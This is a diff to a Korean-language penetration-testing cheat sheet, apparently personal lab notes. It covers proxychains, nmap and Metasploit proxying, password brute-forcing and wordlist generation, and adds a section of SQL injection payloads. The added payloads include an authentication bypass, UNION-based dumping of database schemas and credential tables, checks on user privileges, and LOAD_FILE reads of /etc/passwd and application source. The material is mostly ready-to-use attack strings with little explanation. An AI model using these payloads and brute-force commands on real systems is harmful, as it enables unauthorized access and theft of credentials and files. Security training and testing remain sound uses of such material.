@@ -1,6 +1,6 @@
 # Proxying Tools
 
-## Proxychains
+## 1. Proxychains
 ```
 cat /etc/proxychains.conf
 
@@ -9,10 +9,10 @@ http 127.0.0.1 8080
 ```
 ```proxychains curl http://SERVER_IP:PORT```
 
-## NMAP
+## 2. NMAP
 ```nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC```
 
-## Metasploit
+## 3. Metasploit
 ```
 use auxiliary/scanner/http/robots_txt
 msf6 auxiliary(scanner/http/robots_txt) > set PROXIES HTTP:127.0.0.1:8080
@@ -216,7 +216,7 @@ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -
 <br/><br/>
 # 사용자 정의 단어 목록
 
-## 사용자 이름 Anarchy
+## 1. 사용자 이름 Anarchy
 ```
 sudo apt install ruby -y
 git clone https://github.com/urbanadventurer/username-anarchy.git
@@ -224,11 +224,89 @@ cd username-anarchy
 ./username-anarchy Jane Smith > jane_smith_usernames.txt
 ```
 
-## CUPP (Common User Passwords Profiler)
+## 2. CUPP (Common User Passwords Profiler)
 ```
 sudo apt install cupp -y
 cupp -i    # 대화형 모드
 grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt   # 비밀번호 정책 적용
 ```
+
+<br/><br/>
+# SQL Injection
+> 참고 : [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
+
+## 1. 주석 사용
+
+### 주석이 있는 인증 우회
+```SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';```
+
+## 2. Union 절
+
+### 짝수 Columns
+```SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '```
+
+### 고르지 않은 Columns
+```SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '```
+
+## 3. Union Injection
+
+### ORDER BY 사용
+```
+' order by 1-- -
+' order by 2-- -
+' order by 3-- -
+' order by 4-- -
+```
+> 알림: (-) 뒤에 공백이 있다는 것을 나타내기 위해 대시(-)를 하나 더 추가
+
+### UNION 사용
+```
+cn' UNION select 1,2,3-- -
+cn' UNION select 1,2,3,4-- -
+```
+
+### Injection 위치
+```cn' UNION select 1,@@version,3,4-- -```
+
+## 4. MySQL Fingerprinting
+
+### INFORMATION_SCHEMA 데이터베이스
+```cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -```<br/>
+```cn' UNION select 1,database(),2,3-- -```
+
+### TABLES
+```cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -```
+
+### COLUMNS
+```cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -```
+
+### Data
+```cn' UNION select 1, username, password, 4 from dev.credentials-- -```
+
+## 4. 파일 읽기
+
+### DB User
+```cn' UNION SELECT 1, user(), 3, 4-- -```<br/>
+또는 ```cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -```
+
+### 사용자 권한
+```
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+
+### LOAD_FILE
+```
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+```
+
+
+
+
+
+
 
 
